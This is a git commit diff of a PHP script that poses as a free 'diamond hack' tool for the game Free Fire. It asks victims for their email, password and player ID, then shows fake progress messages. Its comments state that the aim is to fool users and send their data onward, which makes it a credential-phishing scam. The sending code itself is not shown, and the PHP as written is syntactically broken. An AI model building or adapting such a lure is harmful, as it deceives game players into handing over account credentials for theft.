3eb5c51842ab344a2edebf20374b17084d030a60
Hack Solustion <50937775+hacksolustion@users.noreply.github.com>
2019-05-29 23:40:43 +0700

    Add files via upload

--- DiamondFF.php
+++ DiamondFF.php
@@ -1,25 +1,25 @@
 <?php
-//For Diamond Top Up Free
-echo "\033[95mHACK DIAMOND FREE FIRE v.2"		
+//kecoh tross sampe mamposss
+echo "\033[95mTOOLS HACK DIAMOND FREE FIRE"		
 echo "\033[95mDONT USE THIS FOR ILEGAL PURPOSE !"
-echo "\033[95mAUTHOR: Garena"
-echo "\033[95mFACEBOOK: Garena Free Fire Official"
-//Get Access Data
+echo "\033[95mAUTHOR: DelLuxeZ"
+echo "\033[95mFACEBOOK: ImanuelTaroreh"
+//emailna
 echo "\033[93Masukan email anda :   ";
 $imel = trim(fgets(STDIN));
-//Get Access Data
+//passwordna
 echo "\033[93mMasukan password anda : ";
 $san = trim(fgets(STDIN));
 echo "\033[93mMasukan ID free fire anda : ";
 $gg = val(fgets(STDIN));
-echo "\033[93mMasukan Pangkat Rank Free Fire Anda : ";
+echo "\033[93mMasukan Rank Free Fire Anda : ";
 $gg = trim(fgets(STDIN));
-echo "\033[93mMasukan Jumlah diamond yang dinginkan (Max1000) : "
+echo "\033[93mMasukan Jumlah diamond (1000) : "
 $tod = trim(fgets(STDIN));
 echo "\033[91m<---------RESULT--------->"
-echo "\033[92mInfo Player $imel And $san Injection Diamond\n";
-echo "\033[92mGet Access Login Website GARENA FreeFire"
-echo "\033[92mInject Started............";
+echo "\033[92mDATA ANDA $imel DAN $san SIAP DI GUNAKAN\n";
+echo "\033[92mMemulai Proses ke website garena"
+echo "\033[92mRUNTIME BEGIN............";
 echo "\033[92m==10%";
 echo "\033[92m===20%";
 echo "\033[92m====30%";
@@ -31,13 +31,8 @@ echo "\033[92m=========80%";
 echo "\033[92m==========90%";
 echo "\033[92m===========100%";
 echo "\033[92mGeting root acces";
-echo "\033[91mNO ROOT ACCES";
-echo "\033[91mGet Info Game";
-echo "\033[91mCheck Info Game";
-echo "\033[91mCheck Acces Data Website Garena Free Fire";
-echo "\033[91mGet Access Game Data";
-echo "\033[91mInjection Access Data";
-echo "\033[91mWait Injection Your Account!!!";
+echo "\033[91mYAIKKSS NO ROOT ACCES";
+echo "\033[91mFUCK THE SISTEM !!!";
 //ini buat ngirim data orang
 //jgn banyak diganti yaaa:v
 		ini_set( 'display_error', 1);
